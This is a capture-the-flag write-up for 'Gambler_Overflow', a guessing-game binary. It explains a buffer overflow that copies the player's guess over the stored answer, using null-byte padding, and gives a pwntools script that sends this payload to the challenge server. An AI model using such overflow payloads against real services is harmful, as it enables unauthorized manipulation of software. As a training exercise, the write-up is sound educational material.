# Gambler_Overflow
## Description
This challenge gives you an ELF file and remote server that ask you to guess random strings to get coins. Getting enough coins gives you the flag. This time, the random seed is not static.
## Solution
You can overflow the buffer for your guess into the buffer for the correct solution. By making both strings identical you will win and get coins. You need to put null bytes (`\x00`) in between the two buffers because a null byte denotes the end of a string. Otherwise, the first string would keep going until the end of the second string.
## Solve Script
```py
from pwn import *  
context.log_level = "critical"  
r = remote('ctf.b01lers.com', 9203)  
for _ in range(89):  
    r.recvuntil(b"letters: ")  
    r.send(b"a" * 4 + b"\x00" * 4 + b"a" * 4 + b"\n")  
r.send(b"a" * 4 + b"\x00" * 4 + b"a" * 4 + b"\n")  
r.interactive()
```